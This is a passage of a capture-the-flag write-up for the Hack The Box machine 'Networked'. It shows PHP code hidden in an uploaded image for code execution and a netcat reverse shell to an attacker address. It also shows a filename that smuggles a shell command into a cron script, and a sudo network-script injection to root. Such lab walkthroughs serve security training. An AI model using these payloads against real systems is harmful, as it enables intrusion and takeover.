    <span class="nv">$validext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">'.png'</span><span class="p">,</span> <span class="s1">'.gif'</span><span class="p">,</span> <span class="s1">'.jpeg'</span><span class="p">);</span>
    <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$validext</span> <span class="k">as</span> <span class="nv">$vext</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr_compare</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"name"</span><span class="p">],</span> <span class="nv">$vext</span><span class="p">,</span> <span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$vext</span><span class="p">))</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$valid</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$valid</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"&lt;p&gt;Invalid image file&lt;/p&gt;"</span><span class="p">;</span>
      <span class="nx">displayform</span><span class="p">();</span>
      <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'_'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span><span class="o">.</span><span class="s1">'.'</span><span class="o">.</span><span class="nv">$ext</span><span class="p">;</span>

    <span class="nv">$success</span> <span class="o">=</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">[</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"&lt;p&gt;Unable to save file.&lt;/p&gt;"</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">"&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;"</span><span class="p">;</span>

    <span class="c1">// set proper permissions on the new file
</span>    <span class="nb">chmod</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">displayform</span><span class="p">();</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">/upload.php</code>:<br>
<img src="/images/hackthebox/networked/3.png" alt="">
<br><br>
<code class="highlighter-rouge">/photos.php</code>:<br>
<img src="/images/hackthebox/networked/4.png" alt="">
<br></p>
<hr>

<h2 id="rce--shell-as-apache">RCE –&gt; Shell as apache</h2>
<p><br>We can use <code class="highlighter-rouge">upload.php</code> to upload images then we can view them through <code class="highlighter-rouge">photos.php</code> or <code class="highlighter-rouge">/uploads/image_name</code>. For some time I tried to bypass the extension filter in <code class="highlighter-rouge">upload.php</code> to upload <code class="highlighter-rouge">php</code> files but I wasn’t able to bypass it. However I could get <code class="highlighter-rouge">RCE</code> by injecting <code class="highlighter-rouge">php</code> code in the uploaded images.
<br>I got a solid black image and called it <code class="highlighter-rouge">original.png</code>, let’s upload it:<br>
<img src="/images/hackthebox/networked/5.png" alt="">
<br>
<br>
<img src="/images/hackthebox/networked/6.png" alt="">
<br><br><img src="/images/hackthebox/networked/7.png" alt="">
<br><br><img src="/images/hackthebox/networked/8.png" alt="">
<br><br>Now let’s copy that image and inject some <code class="highlighter-rouge">php</code> code into the new image:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# cp original.png ./test.png
root@kali:~/Desktop/HTB/boxes/networked# echo '&lt;?php' &gt;&gt; test.png
root@kali:~/Desktop/HTB/boxes/networked# echo 'passthru("whoami");' &gt;&gt; test.png
root@kali:~/Desktop/HTB/boxes/networked# echo '?&gt;' &gt;&gt; test.png
root@kali:~/Desktop/HTB/boxes/networked# mv test.png test.php.png
root@kali:~/Desktop/HTB/boxes/networked# 
</code></pre></div></div>
<p><br>I injected <code class="highlighter-rouge">&lt;?php passthru("whoami"); ?&gt;</code> which should execute <code class="highlighter-rouge">whoami</code>, let’s test it:<br>
<img src="/images/hackthebox/networked/9.png" alt="">
<br><br>
<img src="/images/hackthebox/networked/10.png" alt="">
<br><br><img src="/images/hackthebox/networked/11.png" alt="">
<br><br>Now if we view the file from <code class="highlighter-rouge">/uploads</code> we won’t get the image, we’ll get the binary data of the image and the result of the executed <code class="highlighter-rouge">php</code> code at the end:<br>
<img src="/images/hackthebox/networked/12.png" alt="">
<br><br><code class="highlighter-rouge">whoami</code> got executed successfully and we’re the user <code class="highlighter-rouge">apache</code>.
<br>I created another one to get a reverse shell:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# cp original.png ./shell.php.png
root@kali:~/Desktop/HTB/boxes/networked# echo '&lt;?php' &gt;&gt; ./shell.php.png 
root@kali:~/Desktop/HTB/boxes/networked# echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f");' &gt;&gt; ./shell.php.png 
root@kali:~/Desktop/HTB/boxes/networked# echo '?&gt;' &gt;&gt; ./shell.php.png 
root@kali:~/Desktop/HTB/boxes/networked# 
</code></pre></div></div>
<p><br>And I got a shell as <code class="highlighter-rouge">apache</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:55662.
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.2$ hostname
hostname
networked.htb
sh-4.2$ 
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="command-injection-in-check_attackphp--shell-as-guly--user-flag">Command Injection in check_attack.php –&gt; Shell as guly –&gt; User Flag</h2>
<p><br>First thing I did after getting a shell was to make it stable:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sh-4.2$ which python
which python
/usr/bin/python
sh-4.2$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
bash-4.2$ ^Z
[1]+  Stopped                 nc -lvnp 1337
root@kali:~/Desktop/HTB/boxes/networked# stty raw -echo
root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1337

bash-4.2$ export TERM=screen
bash-4.2$ 
</code></pre></div></div>
<p><br>Then I started to enumerate the box, there was only one user on the box called <code class="highlighter-rouge">guly</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ cd /home/
bash-4.2$ ls -al
total 0
drwxr-xr-x.  3 root root  18 Jul  2 13:27 .
dr-xr-xr-x. 17 root root 224 Jul  2 13:27 ..
drwxr-xr-x.  2 guly guly 178 Nov 16 00:31 guly
bash-4.2$ cd guly/
bash-4.2$ ls -al
total 32
drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .
drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..
lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&gt; /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-rw-------  1 guly guly 1920 Nov 16 00:27 dead.letter
-r--------. 1 guly guly   33 Oct 30  2018 user.txt
bash-4.2$ cat user.txt 
cat: user.txt: Permission denied
bash-4.2$ 
</code></pre></div></div>
<p><br>We can’t read the flag as <code class="highlighter-rouge">apache</code>, but there are some other interesting readable stuff, <code class="highlighter-rouge">crontab.guly</code> shows that <code class="highlighter-rouge">/home/guly/check_attack.php</code> gets executed as <code class="highlighter-rouge">guly</code> every 3 minutes:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
bash-4.2$
</code></pre></div></div>
<p><br><code class="highlighter-rouge">check_attack.php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">bash</span><span class="o">-</span><span class="mf">4.2</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">check_attack</span><span class="o">.</span><span class="nx">php</span>
<span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>

<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">#echo "-------------\n";
</span>
  <span class="c1">#print "check: $value\n";
</span>  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nx">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
  <span class="nv">$check</span> <span class="o">=</span> <span class="nx">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="c1"># todo: attach file
</span>    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nx">FILE_APPEND</span> <span class="o">|</span> <span class="nx">LOCK_EX</span><span class="p">);</span>

    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span>
    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
bash-4.2$
</code></pre></div></div>
<p><br>This script checks for files that aren’t supposed to be in the uploads directory and deletes them, the interesting part is how it deletes the files, it appends the file name to the <code class="highlighter-rouge">rm</code> command without any filtering which makes it vulnerable to command injection:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span>
</code></pre></div></div>
<p><br><code class="highlighter-rouge">$path</code> is the path of the uploads directory:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
</code></pre></div></div>
<p><br>And <code class="highlighter-rouge">$value</code> is the suspicious file’s name.
<br>We can simply go to <code class="highlighter-rouge">/var/www/html/uploads</code> and create a file that holds the payload in its name. The name will start with a semicolon <code class="highlighter-rouge">;</code> (to inject the new command) then the reverse shell command.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2$ cd /var/www/html/uploads
bash-4.2$ touch '; nc 10.10.xx.xx 1338 -c bash'
bash-4.2$
</code></pre></div></div>
<p><br>After some time I got a shell as <code class="highlighter-rouge">guly</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1338
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1338
Ncat: Listening on 0.0.0.0:1338
Ncat: Connection from 10.10.10.146.
Ncat: Connection from 10.10.10.146:60812.
whoami
guly
python -c "import pty;pty.spawn('/bin/bash')"
[guly@networked ~]$ ^Z
[1]+  Stopped                 nc -lvnp 1338
root@kali:~/Desktop/HTB/boxes/networked# stty raw -echo 
root@kali:~/Desktop/HTB/boxes/networked# nc -lvnp 1338

[guly@networked ~]$ export TERM=screen
[guly@networked ~]$ id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
[guly@networked ~]$ ls -al
total 32
drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .
drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..
lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&gt; /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-rw-------  1 guly guly 3072 Nov 16 00:48 dead.letter
-r--------. 1 guly guly   33 Oct 30  2018 user.txt
-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo
[guly@networked ~]$ 
</code></pre></div></div>
<p><br>
<img src="/images/hackthebox/networked/13.png" alt="">
<br>
<br>We owned user.
<br></p>
<hr>

<h2 id="command-injection-in-the-network-script-name--root-shell--root-flag">Command Injection in the Network Script Name –&gt; Root Shell –&gt; Root Flag</h2>
<p><br>As <code class="highlighter-rouge">guly</code> I checked <code class="highlighter-rouge">sudo -l</code> and found that <code class="highlighter-rouge">guly</code> can run <code class="highlighter-rouge">/usr/local/sbin/changename.sh</code> as root without a password:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
[guly@networked ~]$ 
</code></pre></div></div>
<p><br><code class="highlighter-rouge">changename.sh</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">cat</span> /usr/local/sbin/changename.sh
<span class="c">#!/bin/bash -p</span>
<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
</span><span class="no">EoF

</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>

<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
        <span class="nb">read </span>x
        <span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
                </span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
                <span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
                <span class="nb">read </span>x
        <span class="k">done
        </span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
<span class="k">done</span>

/sbin/ifup guly0
<span class="o">[</span>guly@networked ~]<span class="err">$</span>
</code></pre></div></div>
<p><br>This script simply creates a network script for an interface called <code class="highlighter-rouge">guly</code> then activates that interface. It asks the user for these options: <code class="highlighter-rouge">NAME</code>, <code class="highlighter-rouge">PROXY_METHOD</code>, <code class="highlighter-rouge">BROWSER_ONLY</code>, <code class="highlighter-rouge">BOOTPROTO</code>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
</code></pre></div></div>
<p>We’re only interested in the <code class="highlighter-rouge">NAME</code> option because according to <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f" target="_blank" rel="noopener noreferrer">this page</a> we can inject commands in the interface name.  Let’s try to execute <code class="highlighter-rouge">bash</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
test bash
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
[root@networked network-scripts]# whoami
root
[root@networked network-scripts]# id
uid=0(root) gid=0(root) groups=0(root)
[root@networked network-scripts]# cd /root/
[root@networked ~]# ls -la
total 28
dr-xr-x---.  2 root root  144 Jul 15 11:34 .
dr-xr-xr-x. 17 root root  224 Jul  2 13:27 ..
lrwxrwxrwx.  1 root root    9 Jul  2 13:35 .bash_history -&gt; /dev/null
-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc
-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
-r--------.  1 root root   33 Oct 30  2018 root.txt
-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
-rw-------   1 root root 1011 Jul 15 11:34 .viminfo
[root@networked network-scripts]#
</code></pre></div></div>
<p><br>And we got a root shell.<br>
<img src="/images/hackthebox/networked/14.png" alt="">
<br><br>We owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.
<br>
<br>
<br>Previous Hack The Box write-up : <a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/smasher2/">
            Hack The Box - Smasher2
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/wall/">
            Hack The Box - Wall
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/heist/">
            Hack The Box - Heist
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
